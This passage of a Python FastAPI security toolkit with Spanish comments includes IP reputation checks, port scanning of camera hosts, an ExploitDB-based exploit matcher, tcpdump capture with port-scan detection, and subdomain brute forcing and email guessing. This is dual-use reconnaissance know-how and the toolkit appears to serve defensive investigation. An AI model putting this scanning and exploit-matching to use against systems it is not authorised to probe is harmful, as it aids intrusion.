                    "filename": fname,
                    "hash": file_hash,
                    "timestamp": datetime.now().isoformat()
                })

        motion_detected = len(captures) > 0

        # Broadcast alert si hay movimiento
        if motion_detected:
            await broadcast({"type": "alert", "payload": f"🚨 Movimiento detectado en {rtsp_url}: {len(captures)} capturas"})

        return {
            "rtsp_url": rtsp_url,
            "motion_detected": motion_detected,
            "captures": captures,
            "threshold": threshold,
            "duration": duration
        }
    except subprocess.TimeoutExpired:
        return {"rtsp_url": rtsp_url, "motion_detected": False, "captures": [], "error": "Timeout"}
    except Exception as e:
        return {"rtsp_url": rtsp_url, "motion_detected": False, "captures": [], "error": str(e)}
    finally:
        # Limpiar frames temporales
        if os.path.exists(frames_dir):
            for f in os.listdir(frames_dir):
                os.unlink(os.path.join(frames_dir, f))
            os.rmdir(frames_dir)

# == END SALA DE GUERRA ===============================================

# ============================================================
# MÓDULO 1: THREAT INTELLIGENCE (AbuseIPDB + Cache SQLite)
# ============================================================

import sqlite3 as _sqlite3
import ipaddress as _ipaddr_check

INTEL_CACHE_DB = str(DATA_DIR / "intel_cache.db")
_abuseipdb_key = os.environ.get("ABUSEIPDB_KEY", "")

def _init_intel_db():
    conn = _sqlite3.connect(INTEL_CACHE_DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS ip_cache (
        ip TEXT PRIMARY KEY, data TEXT, timestamp TEXT, abuse_score INTEGER
    )''')
    conn.commit()
    conn.close()

_init_intel_db()

async def _check_abuseipdb(ip: str) -> dict:
    if not _abuseipdb_key:
        return {"error": "API key no configurada. Regístrate gratis en abuseipdb.com y setea ABUSEIPDB_KEY"}
    url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90&verbose="
    headers = {"Key": _abuseipdb_key, "Accept": "application/json"}
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.get(url, headers=headers, timeout=10)
            if resp.status_code == 200:
                return resp.json().get("data", {})
            return {"error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def _get_cached_ip(ip: str) -> Optional[dict]:
    conn = _sqlite3.connect(INTEL_CACHE_DB)
    c = conn.cursor()
    c.execute("SELECT data, timestamp FROM ip_cache WHERE ip = ?", (ip,))
    row = c.fetchone()
    conn.close()
    if row:
        try:
            cache_time = datetime.fromisoformat(row[1])
            if datetime.now() - cache_time < timedelta(hours=24):
                return json.loads(row[0])
        except Exception:
            pass
    return None

def _cache_ip(ip: str, data: dict):
    conn = _sqlite3.connect(INTEL_CACHE_DB)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO ip_cache VALUES (?, ?, ?, ?)",
              (ip, json.dumps(data), datetime.now().isoformat(), data.get("abuseConfidenceScore", 0)))
    conn.commit()
    conn.close()

@app.get("/api/intel/ip/{ip}")
async def get_ip_reputation(ip: str):
    try:
        _ipaddr_check.ip_address(ip)
    except ValueError:
        raise HTTPException(status_code=400, detail="IP inválida")

    cached = _get_cached_ip(ip)
    if cached:
        score = cached.get("abuseConfidenceScore", 0)
        return {
            "ip": ip, "abuse_score": score,
            "country": cached.get("countryCode", "Unknown"),
            "isp": cached.get("isp", "Unknown"),
            "total_reports": cached.get("totalReports", 0),
            "last_reported": cached.get("lastReportedAt", "Never"),
            "is_tor": cached.get("isTor", False),
            "verdict": "MALICIOUS" if score > 75 else "SUSPICIOUS" if score > 25 else "CLEAN",
            "cached": True
        }

    # Intentar AbuseIPDB si hay API key
    if _abuseipdb_key:
        data = await _check_abuseipdb(ip)
        if "error" not in data:
            _cache_ip(ip, data)
            score = data.get("abuseConfidenceScore", 0)
            return {
                "ip": ip, "abuse_score": score,
                "country": data.get("countryCode", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "total_reports": data.get("totalReports", 0),
                "last_reported": data.get("lastReportedAt", "Never"),
                "is_tor": data.get("isTor", False),
                "verdict": "MALICIOUS" if score > 75 else "SUSPICIOUS" if score > 25 else "CLEAN",
                "cached": False,
                "source": "abuseipdb"
            }

    # Fallback: ipwho.is (gratis, sin API key)
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(f"https://ipwho.is/{ip}")
            if resp.status_code == 200:
                geo = resp.json()
                if geo.get("success", True):
                    fallback_data = {
                        "abuseConfidenceScore": 0,
                        "countryCode": geo.get("country_code", "Unknown"),
                        "isp": geo.get("connection", {}).get("isp", geo.get("connection", {}).get("org", "Unknown")),
                        "totalReports": 0,
                        "lastReportedAt": "Never",
                        "isTor": False
                    }
                    _cache_ip(ip, fallback_data)
                    return {
                        "ip": ip, "abuse_score": 0,
                        "country": fallback_data["countryCode"],
                        "isp": fallback_data["isp"],
                        "total_reports": 0,
                        "last_reported": "Never",
                        "is_tor": False,
                        "verdict": "CLEAN",
                        "cached": False,
                        "source": "ipwho.is (sin API key)",
                        "note": "Sin AbuseIPDB key — datos geográficos únicamente"
                    }
    except Exception:
        pass

    raise HTTPException(status_code=503, detail="No se pudo consultar reputación de IP. Configura ABUSEIPDB_KEY para análisis completo.")

@app.post("/api/intel/bulk-check")
async def bulk_check_ips(request: Request):
    """Consulta masiva con rate limiting (max 5 concurrentes)."""
    try:
        ips = await request.json()
        if not isinstance(ips, list):
            raise HTTPException(status_code=400, detail="Se esperaba una lista de IPs")
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="JSON inválido")

    semaphore = asyncio.Semaphore(5)

    async def check_one(ip):
        async with semaphore:
            try:
                return await get_ip_reputation(ip)
            except Exception as e:
                return {"ip": ip, "error": str(e), "verdict": "UNKNOWN"}

    results = await asyncio.gather(*[check_one(ip) for ip in ips[:20]])
    malicious = sum(1 for r in results if isinstance(r, dict) and r.get("verdict") == "MALICIOUS")
    return {"results": results, "total": len(results), "malicious": malicious}

# == END THREAT INTEL =================================================

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINT — INVESTIGACIÓN COMPLETA DE IP (Due Diligence)
#  Combina geo + intel + abuseipdb + shodan + rdns + blocklist
#  Para investigar antecedentes de IPs y cámaras de segunda mano
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/investigate/ip/{ip}")
async def investigate_ip(ip: str):
    """
    Investigación completa de una IP para due diligence.
    Combina todas las fuentes OSINT disponibles:
    - Geo-localización (ipwho.is, sin API key)
    - Threat intel assessment (scoring, flags, blocklist)
    - AbuseIPDB reputation (si hay API key)
    - Shodan (si hay API key)
    - rDNS lookup
    - Análisis de riesgo consolidado
    
    Útil para investigar antecedentes de IPs/cámaras de segunda mano.
    """
    import ipaddress as _ipa
    try:
        _ipa.ip_address(ip)
    except ValueError:
        raise HTTPException(status_code=400, detail="IP inválida")

    result = {
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "sources": {},
        "risk_assessment": {},
        "recommendations": []
    }

    # 1. Geo-localización (siempre disponible, sin API key)
    try:
        if _GEO_INTEL_OK:
            result["sources"]["geo"] = _geo_lookup(ip)
        else:
            from geo_intel import lookup
            result["sources"]["geo"] = lookup(ip)
    except Exception as e:
        result["sources"]["geo"] = {"error": str(e)}

    geo = result["sources"].get("geo", {})
    
    # 2. Threat Intel Assessment (siempre disponible, sin API key)
    try:
        if _GEO_INTEL_OK:
            result["sources"]["intel"] = _intel_assess(ip)
        else:
            from geo_intel import assess
            result["sources"]["intel"] = assess(ip)
    except Exception as e:
        result["sources"]["intel"] = {"error": str(e)}

    intel = result["sources"].get("intel", {})

    # 3. AbuseIPDB (si hay API key)
    try:
        abuse = await _check_abuseipdb(ip)
        result["sources"]["abuseipdb"] = abuse
    except Exception as e:
        result["sources"]["abuseipdb"] = {"error": str(e)}

    abuse = result["sources"].get("abuseipdb", {})
    abuse_score = abuse.get("abuseConfidenceScore", 0) if "error" not in abuse else None

    # 4. Shodan (si hay API key)
    shodan_key = os.environ.get("SHODAN_API_KEY", "")
    if shodan_key:
        try:
            async with httpx.AsyncClient(timeout=15) as c:
                r = await c.get(f"https://api.shodan.io/shodan/host/{ip}?key={shodan_key}")
                if r.status_code == 200:
                    result["sources"]["shodan"] = r.json()
                else:
                    result["sources"]["shodan"] = {"error": f"HTTP {r.status_code}"}
        except Exception as e:
            result["sources"]["shodan"] = {"error": str(e)}
    else:
        result["sources"]["shodan"] = {"note": "SHODAN_API_KEY no configurada"}

    shodan = result["sources"].get("shodan", {})
    shodan_ports = shodan.get("ports", []) if isinstance(shodan, dict) else []

    # 5. rDNS
    try:
        rdns = socket.gethostbyaddr(ip)[0]
        result["sources"]["rdns"] = rdns
    except Exception:
        result["sources"]["rdns"] = None

    # 6. Risk Assessment Consolidado
    risk_score = 0
    risk_factors = []

    if geo.get("hosting"):
        risk_score += 15
        risk_factors.append({"factor": "Hosting/Cloud", "weight": 15, "detail": f"ISP: {geo.get('isp', '?')}"})
    
    if geo.get("proxy"):
        risk_score += 25
        risk_factors.append({"factor": "Proxy/VPN", "weight": 25, "detail": "IP usa proxy o VPN"})
    
    if intel.get("blocklist") and ip in (intel.get("flags", {}).get("blocklist", "") or ""):
        risk_score += 40
        risk_factors.append({"factor": "Blocklist abuse.ch", "weight": 40, "detail": "IP en lista de bloqueo"})

    if abuse_score is not None:
        if abuse_score > 75:
            risk_score += 40
            risk_factors.append({"factor": "AbuseIPDB Crítico", "weight": 40, "detail": f"Score: {abuse_score}/100"})
        elif abuse_score > 25:
            risk_score += 20
            risk_factors.append({"factor": "AbuseIPDB Sospechoso", "weight": 20, "detail": f"Score: {abuse_score}/100"})
        elif abuse_score == 0:
            risk_factors.append({"factor": "AbuseIPDB Limpio", "weight": 0, "detail": "Sin reportes de abuso"})

    if shodan_ports:
        cam_ports = [p for p in shodan_ports if p in [554, 8000, 8080, 8888, 37777, 37778]]
        if cam_ports:
            risk_score += 10
            risk_factors.append({"factor": "Puertos de cámara abiertos", "weight": 10, "detail": f"Puertos: {cam_ports}"})

    intel_score = intel.get("score", 0)
    if intel_score > 50:
        risk_score += 20
        risk_factors.append({"factor": "Threat Intel Score alto", "weight": 20, "detail": f"Score: {intel_score}/100, {intel.get('label', '?')}"})

    risk_score = max(0, min(100, risk_score))
    
    if risk_score >= 70:
        verdict = "ALTO RIESGO"
        recommendation = "NO usar sin investigación adicional. Posible equipo comprometido o robado."
    elif risk_score >= 40:
        verdict = "RIESGO MEDIO"
        recommendation = "Precaución. Verificar procedencia con documentación."
    elif risk_score >= 20:
        verdict = "RIESGO BAJO"
        recommendation = "Bajo riesgo. Verificar documentación normal."
    else:
        verdict = "LIMPIO"
        recommendation = "Sin señales de riesgo. Proceder con normalidad."

    result["risk_assessment"] = {
        "score": risk_score,
        "verdict": verdict,
        "factors": risk_factors,
        "recommendation": recommendation
    }

    # Recommendations específicas
    recs = []
    if abuse_score is not None and abuse_score > 0:
        recs.append(f"AbuseIPDB: {abuse_score}/100 — {abuse.get('totalReports', 0)} reportes en 90 días")
    if geo.get("hosting"):
        recs.append(f"IP pertenece a hosting/cloud ({geo.get('isp')}) — no es ISP residencial")
    if shodan_ports:
        recs.append(f"Shodan detectó puertos abiertos: {shodan_ports}")
        if 554 in shodan_ports:
            recs.append("Puerto 554 (RTSP) abierto — cámara accesible públicamente en el pasado")
    if result["sources"]["rdns"]:
        recs.append(f"rDNS: {result['sources']['rdns']}")
    if intel.get("blocklist"):
        recs.append("IP aparece en blocklist de abuse.ch (botnet/C2 conocido)")
    recs.append(recommendation)
    result["recommendations"] = recs

    return result


@app.get("/api/investigate/camera/{ip}")
async def investigate_camera(ip: str, port: int = 80):
    """
    Investigación de una cámara IP específica.
    Combina investigación de IP + detección de marca/modelo + puertos + streams.
    """
    import ipaddress as _ipa
    try:
        _ipa.ip_address(ip)
    except ValueError:
        raise HTTPException(status_code=400, detail="IP inválida")

    # 1. Investigación base de la IP
    ip_investigation = await investigate_ip(ip)

    # 2. Detección de marca/modelo
    banner = await _http_banner(ip, port, "/", timeout=5.0)
    brand = _detect_camera_brand(banner.get("server", "") + " " + banner.get("body_preview", ""))

    # 3. Detección de streams de video
    video_sources = _detect_video_urls(ip, port, timeout=3.0)

    # 4. Escaneo de puertos comunes de cámara
    cam_ports = [80, 443, 554, 8000, 8080, 8888, 37777, 37778]
    open_ports = {}
    for p in cam_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((ip, p))
            if result == 0:
                open_ports[p] = "open"
            sock.close()
        except Exception:
            pass

    # 5. SSL info si hay HTTPS
    ssl_info = None
    if 443 in open_ports or port in (443, 8443):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info = {"issuer": dict(x[0]) for x in cert.get("issuer", [])} if cert else None
        except Exception:
            ssl_info = {"error": "No se pudo obtener certificado SSL"}

    return {
        "ip": ip,
        "port": port,
        "brand": brand,
        "banner": banner,
        "video_sources": video_sources,
        "open_ports": open_ports,
        "ssl_info": ssl_info,
        "ip_investigation": ip_investigation,
        "timestamp": datetime.now().isoformat()
    }



# ============================================================
# MÓDULO 2: EXPLOIT MATCHER (ExploitDB)
# ============================================================

EXPLOIT_DB_DIR = str(DATA_DIR / "exploitdb")
EXPLOIT_CSV = os.path.join(EXPLOIT_DB_DIR, "files_exploits.csv")

def _init_exploit_db():
    os.makedirs(EXPLOIT_DB_DIR, exist_ok=True)
    if not os.path.exists(EXPLOIT_CSV):
        try:
            import requests as _req
            r = _req.get("https://raw.githubusercontent.com/offensive-security/exploitdb/master/files_exploits.csv", timeout=60)
            if r.status_code == 200 and len(r.content) > 1000:
                with open(EXPLOIT_CSV, "wb") as f:
                    f.write(r.content)
                print("[+] ExploitDB descargado")
        except Exception as e:
            print(f"[!] Error descargando ExploitDB: {e}")

def _search_exploits(service: str, version: str = None) -> list:
    if not os.path.exists(EXPLOIT_CSV):
        _init_exploit_db()
    if not os.path.exists(EXPLOIT_CSV):
        return []

    exploits = []
    with open(EXPLOIT_CSV, "r", encoding="utf-8", errors="ignore") as f:
        next(f)  # skip header
        for line in f:
            parts = line.strip().split(",")
            if len(parts) < 7:
                continue
            eid, file_path, title = parts[0], parts[1], parts[2]
            platform = parts[5] if len(parts) > 5 else "unknown"
            etype = parts[6] if len(parts) > 6 else "unknown"

            title_lower = title.lower()
            service_lower = service.lower()

            confidence = None
            if service_lower in title_lower:
                if version and version in title:
                    confidence = "HIGH"
                else:
                    confidence = "MEDIUM"
            elif any(k in title_lower for k in service_lower.split()):
                confidence = "LOW"

            if confidence:
                exploits.append({
                    "id": eid, "title": title, "platform": platform,
                    "type": etype, "verified": "verified" in title_lower,
                    "url": f"https://www.exploit-db.com/exploits/{eid}",
                    "match_confidence": confidence
                })

    priority = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
    exploits.sort(key=lambda x: priority.get(x.get("match_confidence", "LOW"), 3))
    return exploits[:25]

@app.post("/api/exploits/match")
async def match_exploits(request: Request):
    try:
        fingerprints = await request.json()
        if not isinstance(fingerprints, list):
            raise HTTPException(status_code=400, detail="Se esperaba una lista de fingerprints")
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="JSON inválido")

    all_matches = []
    for fp in fingerprints:
        name = fp.get("name", "")
        version = fp.get("version")
        matches = _search_exploits(name, version)
        for m in matches:
            all_matches.append({"service": name, "version": version, "exploit": m})

    return {
        "total_matches": len(all_matches),
        "high_confidence": sum(1 for m in all_matches if m["exploit"]["match_confidence"] == "HIGH"),
        "medium_confidence": sum(1 for m in all_matches if m["exploit"]["match_confidence"] == "MEDIUM"),
        "exploits": all_matches
    }

@app.get("/api/exploits/search")
async def search_exploit(query: str = Query(...)):
    return {"query": query, "results": _search_exploits(query)}

@app.post("/api/exploits/init-db")
async def init_exploit_db_endpoint():
    _init_exploit_db()
    if os.path.exists(EXPLOIT_CSV):
        size = os.path.getsize(EXPLOIT_CSV)
        return {"status": "ok", "csv_size": size}
    return {"status": "failed", "message": "No se pudo descargar ExploitDB"}

# == END EXPLOIT MATCHER ==============================================


# ============================================================
# MÓDULO 3: PACKET ANALYZER (tcpdump + detección de anomalías)
# ============================================================

CAPTURE_DIR = str(DATA_DIR / "captures")
os.makedirs(CAPTURE_DIR, exist_ok=True)
_active_captures = {}

@app.post("/api/capture/start")
async def start_capture(interface: str = "any", bpf_filter: str = "", duration: int = 15):
    session_id = uuid.uuid4().hex[:8]
    pcap_file = os.path.join(CAPTURE_DIR, f"{session_id}.pcap")

    cmd = ["tcpdump", "-i", interface, "-w", pcap_file, "-G", str(duration), "-W", "1", "-q"]
    if bpf_filter:
        cmd.extend(bpf_filter.split())

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        _active_captures[session_id] = {
            "process": process, "start_time": datetime.now(),
            "interface": interface, "pcap_file": pcap_file
        }

        # Auto-stop thread
        def auto_stop():
            time.sleep(duration + 2)
            if session_id in _active_captures:
                _stop_capture_internal(session_id)
        threading.Thread(target=auto_stop, daemon=True).start()

        await broadcast({"type": "capture", "payload": f"Captura iniciada en {interface} ({session_id})"})
        return {
            "session_id": session_id, "status": "capturing",
            "interface": interface, "duration": duration, "pcap_file": pcap_file
        }
    except FileNotFoundError:
        raise HTTPException(status_code=503, detail="tcpdump no instalado. Instala: pkg install tcpdump (Termux) o apt install tcpdump")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def _stop_capture_internal(session_id: str):
    if session_id not in _active_captures:
        return None

    session = _active_captures[session_id]
    process = session["process"]

    try:
        process.send_signal(_signal.SIGTERM)
        process.wait(timeout=5)
    except Exception:
        try:
            process.kill()
        except Exception:
            pass

    pcap_file = session["pcap_file"]
    stats = {"total_packets": 0, "protocols": {}, "anomalies": []}

    if os.path.exists(pcap_file):
        try:
            result = subprocess.run(["tcpdump", "-r", pcap_file, "-n"],
                                     capture_output=True, text=True, timeout=30)
            for line in result.stderr.split('\n'):
                if "packets captured" in line:
                    try:
                        stats["total_packets"] = int(line.split()[0])
                    except ValueError:
                        pass
        except Exception:
            pass

        try:
            result = subprocess.run(["tcpdump", "-r", pcap_file, "-n", "-tttt"],
                                     capture_output=True, text=True, timeout=30)
            ip_port_re = re.compile(r'IP6?\s+([\d\.:a-fA-F]+)\.(\d+)\s+>\s+([\d\.:a-fA-F]+)\.(\d+):')
            protocols: dict = {}
            talkers: dict = {}
            listeners: dict = {}
            dst_ports: dict = {}
            arp_count, syn_count, icmp_count = 0, 0, 0
            port_scan_ips: dict = {}

            def _bump(d: dict, k, n: int = 1):
                d[k] = d.get(k, 0) + n

            for line in result.stdout.split('\n'):
                if not line.strip():
                    continue
                if "ARP" in line:
                    arp_count += 1
                    _bump(protocols, "ARP")
                    continue
                if "ICMP" in line:
                    icmp_count += 1
                    _bump(protocols, "ICMP")
                    continue
                m = ip_port_re.search(line)
                if not m:
                    _bump(protocols, "OTHER")
                    continue
                src_ip, src_port, dst_ip, dst_port = m.groups()
                _bump(talkers, src_ip)
                _bump(listeners, dst_ip)
                is_udp = " UDP" in line or ("length" in line and "Flags" not in line and "seq" not in line)
                svc = SERVICE_NAMES.get(int(dst_port), None) if dst_port.isdigit() else None
                svc_src = SERVICE_NAMES.get(int(src_port), None) if src_port.isdigit() else None
                if dst_port in ("53",) or src_port in ("53",):
                    _bump(protocols, "DNS")
                elif dst_port in ("443", "8443") or src_port in ("443", "8443"):
                    _bump(protocols, "HTTPS/TLS")
                elif dst_port in ("80", "8080", "8000") or src_port in ("80", "8080", "8000"):
                    _bump(protocols, "HTTP")
                elif is_udp:
                    _bump(protocols, "UDP")
                else:
                    _bump(protocols, "TCP")
                if "Flags [S]" in line and "length 0" in line:
                    syn_count += 1
                    _bump(port_scan_ips, src_ip)
                label = svc or svc_src or (f"{dst_port}/tcp" if not is_udp else f"{dst_port}/udp")
                _bump(dst_ports, label)

            if arp_count > 50:
                stats["anomalies"].append({
                    "type": "ARP_STORM", "severity": "HIGH",
                    "description": f"Detectados {arp_count} paquetes ARP. Posible ARP Spoofing.",
                    "count": arp_count
                })

            for ip, count in port_scan_ips.items():
                if count > 20:
                    stats["anomalies"].append({
                        "type": "PORT_SCAN", "severity": "MEDIUM",
                        "description": f"Posible port scan desde {ip}: {count} SYN",
                        "source": ip, "count": count
                    })

            stats["protocols"] = protocols
            stats["top_talkers"] = [
                {"ip": ip, "packets": c} for ip, c in
                sorted(talkers.items(), key=lambda x: -x[1])[:6]
            ]
            stats["top_destinations"] = [
                {"ip": ip, "packets": c} for ip, c in
                sorted(listeners.items(), key=lambda x: -x[1])[:6]
            ]
            stats["top_services"] = [
                {"service": s, "packets": c} for s, c in
                sorted(dst_ports.items(), key=lambda x: -x[1])[:6]
            ]
        except Exception as e:
            stats["error"] = str(e)

    del _active_captures[session_id]
    if stats["anomalies"]:
        loop = asyncio.get_event_loop()
        for a in stats["anomalies"]:
            asyncio.ensure_future(broadcast({"type": "alert", "payload": f"🚨 {a['type']}: {a['description']}"}), loop=loop)

    return {
        "session_id": session_id, "status": "completed",
        "analysis": stats, "pcap_file": pcap_file,
        "duration": (datetime.now() - session["start_time"]).seconds
    }

@app.post("/api/capture/stop/{session_id}")
async def stop_capture(session_id: str):
    result = await asyncio.to_thread(_stop_capture_internal, session_id)
    if not result:
        raise HTTPException(status_code=404, detail="Sesión no encontrada")
    return result

@app.get("/api/capture/active")
async def list_active_captures():
    return {"active": [
        {"session_id": sid, "interface": s["interface"],
         "running_for": (datetime.now() - s["start_time"]).seconds}
        for sid, s in _active_captures.items()
    ]}

# == END PACKET ANALYZER ==============================================

# ============================================================
# MÓDULO 4: OSINT ENGINE (crt.sh + brute force + WHOIS + emails)
# ============================================================

OSINT_DB = str(DATA_DIR / "osint_cache.db")
WORDLIST_PATH = str(DATA_DIR / "wordlists" / "subdomains.txt")
_hunter_key = os.environ.get("HUNTER_API_KEY", "")

def _init_osint_db():
    conn = _sqlite3.connect(OSINT_DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_cache (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, type TEXT, data TEXT, timestamp TEXT
    )''')
    conn.commit()
    conn.close()

_init_osint_db()

def _osint_cache_result(target: str, rtype: str, data: dict):
    conn = _sqlite3.connect(OSINT_DB)
    c = conn.cursor()
    c.execute("INSERT INTO osint_cache (target, type, data, timestamp) VALUES (?, ?, ?, ?)",
              (target, rtype, json.dumps(data), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def _osint_get_cache(target: str, rtype: str, hours: int = 24):
    conn = _sqlite3.connect(OSINT_DB)
    c = conn.cursor()
    since = (datetime.now() - timedelta(hours=hours)).isoformat()
    c.execute("SELECT data FROM osint_cache WHERE target = ? AND type = ? AND timestamp > ?",
              (target, rtype, since))
    rows = c.fetchall()
    conn.close()
    return [json.loads(r[0]) for r in rows] if rows else None

async def _fetch_crtsh(domain: str) -> list:
    """Subdominios via crt.sh — 100% gratis, sin API key."""
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    results = []
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                seen = set()
                for entry in data:
                    name = entry.get("name_value", "").strip()
                    if name and name not in seen and "*" not in name:
                        seen.add(name)
                        results.append({"subdomain": name, "source": "crt.sh", "ip": None, "status": "active"})
    except Exception as e:
        print(f"[crt.sh error] {e}")
    return results

async def _brute_subdomains(domain: str, max_concurrent: int = 50) -> list:
    """Brute force de subdominios con dig."""
    os.makedirs(os.path.dirname(WORDLIST_PATH), exist_ok=True)
    if not os.path.exists(WORDLIST_PATH):
        default_words = ["www","mail","ftp","admin","api","app","blog","dev","staging","test",
                         "vpn","ns1","ns2","portal","shop","cdn","media","static","assets",
                         "secure","login","dashboard","panel","cpanel","webmail","smtp","pop",
                         "imap","mx","support","help","docs","wiki","git","gitlab","github",
                         "jenkins","jira","confluence","grafana","prometheus","kibana","elastic",
                         "db","database","sql","mysql","postgres","redis","mongo","backup",
                         "old","beta","alpha","demo","internal","intranet","extranet","private"]
        with open(WORDLIST_PATH, "w") as f:
            f.write("\n".join(default_words))

    with open(WORDLIST_PATH, "r") as f:
        wordlist = [line.strip() for line in f if line.strip()]

    semaphore = asyncio.Semaphore(max_concurrent)
    found = []

    async def check_one(sub: str):
        full = f"{sub}.{domain}"
        async with semaphore:
            # Método 1: dig si está disponible
            try:
                proc = await asyncio.create_subprocess_exec(
                    "dig", "+short", full,
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
                ip = stdout.decode().strip().split("\n")[0]
                if ip and not ip.startswith(";") and ip:
                    found.append({"subdomain": full, "source": "brute-force", "ip": ip, "status": "resolved"})
                    return
            except Exception:
                pass
            # Método 2: socket.gethostbyname (fallback, funciona en Termux sin dig)
            try:
                ip = await asyncio.to_thread(socket.gethostbyname, full)
                found.append({"subdomain": full, "source": "brute-force", "ip": ip, "status": "resolved"})
            except Exception:
                pass

    await asyncio.gather(*[check_one(w) for w in wordlist])
    return found

@app.get("/api/osint/whois/{domain}")
async def osint_whois(domain: str):
    cached = _osint_get_cache(domain, "whois")
    if cached:
        return cached[0]

    try:
        proc = await asyncio.create_subprocess_exec(
            "whois", domain,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        output = stdout.decode()

        parsed = {}
        for line in output.split("\n"):
            if ":" in line and not line.startswith("%"):
                key, val = line.split(":", 1)
                key = key.strip()
                val = val.strip()
                if key and val and key not in parsed:
                    parsed[key] = val

        result = {"domain": domain, "raw": output[:5000], "parsed": parsed}
        _osint_cache_result(domain, "whois", result)
        return result
    except FileNotFoundError:
        raise HTTPException(status_code=503, detail="whois no instalado. Instala: pkg install whois (Termux) o apt install whois (Linux)")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/osint/subdomains/{domain}")
async def osint_subdomains(domain: str, brute: bool = False):
    cached = _osint_get_cache(domain, "subdomains")
    if cached and not brute:
        return {"domain": domain, "subdomains": cached[0], "cached": True}

    crt_results = await _fetch_crtsh(domain)

    brute_results = []
    if brute:
        brute_results = await _brute_subdomains(domain)

    seen = {s["subdomain"] for s in crt_results}
    all_results = crt_results[:]
    for b in brute_results:
        if b["subdomain"] not in seen:
            all_results.append(b)
            seen.add(b["subdomain"])

    _osint_cache_result(domain, "subdomains", all_results)
    await broadcast({"type": "osint", "payload": f"Subdominios de {domain}: {len(all_results)} encontrados"})
    return {"domain": domain, "subdomains": all_results, "cached": False}

@app.get("/api/osint/emails/{domain}")
async def osint_emails(domain: str):
    cached = _osint_get_cache(domain, "emails")
    if cached:
        return {"domain": domain, "emails": cached[0].get("emails", []), "cached": True}

    results = []

    # Hunter.io si hay key
    if _hunter_key:
        try:
            url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={_hunter_key}"
            async with httpx.AsyncClient() as client:
                resp = await client.get(url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    for e in data.get("data", {}).get("emails", []):
                        results.append({"email": e["value"], "source": "hunter.io", "confidence": e.get("confidence")})
        except Exception as e:
            print(f"[Hunter error] {e}")

    # Fallback: pattern guess
    if not results:
        common_patterns = ["info", "admin", "support", "contact", "sales", "webmaster", "security"]
        for pat in common_patterns:
            results.append({"email": f"{pat}@{domain}", "source": "pattern-guess", "confidence": None})

    _osint_cache_result(domain, "emails", {"emails": results})
    return {"domain": domain, "emails": results, "cached": False}

@app.post("/api/osint/metadata")
async def osint_metadata(file_path: str = Query(...)):
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="Archivo no encontrado")

    suspicious_fields = ["Author", "Creator", "Producer", "Company", "Template",
                        "LastModifiedBy", "Manager", "Software"]
    fields = {}
    suspicious = []

    try:
        proc = await asyncio.create_subprocess_exec(
            "exiftool", "-json", file_path,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
        data = json.loads(stdout.decode())
        if data and len(data) > 0:
            meta = data[0]
            for k, v in meta.items():
                if v and str(v).strip():
                    fields[k] = str(v)
                    if any(s.lower() in k.lower() for s in suspicious_fields):
                        suspicious.append(f"{k}: {v}")
    except FileNotFoundError:
        raise HTTPException(status_code=503, detail="exiftool no instalado. Instala: pkg install exiftool (Termux) o apt install libimage-exiftool-perl (Linux)")
    except Exception as e:
        fields["error"] = str(e)

    return {"filename": os.path.basename(file_path), "fields": fields, "suspicious": suspicious}

@app.get("/api/osint/history/{target}")
async def osint_history(target: str):
    conn = _sqlite3.connect(OSINT_DB)
    c = conn.cursor()
    c.execute("SELECT type, data, timestamp FROM osint_cache WHERE target = ? ORDER BY timestamp DESC", (target,))
    rows = c.fetchall()
    conn.close()
    return {"target": target, "history": [{"type": r[0], "data": json.loads(r[1]), "timestamp": r[2]} for r in rows]}

# ============================================================
# NOVOS ENDPOINTS OSINT ENGINE
# ============================================================

DISPOSABLE_DOMAINS = {
    "mailinator.com", "tempmail.com", "10minutemail.com", "guerrillamail.com",
    "throwawaymail.com", "yopmail.com", "trashmail.com", "sharklasers.com",
    "getnada.com", "dispostable.com", "tempail.com", "guerrillamailblock.com"
}

# (platforma, url, [patrones_html_que_indican_no_existe])
# None = confiar solo en status code (GitHub, GitLab dan 404 real)
# Plataformas con detección real validada en vivo (2026-08-20).
# Metodología Sherlock: cada plataforma tiene su propia forma de indicar
# "no existe" — status_code confiable, mensaje específico en HTML, o API.
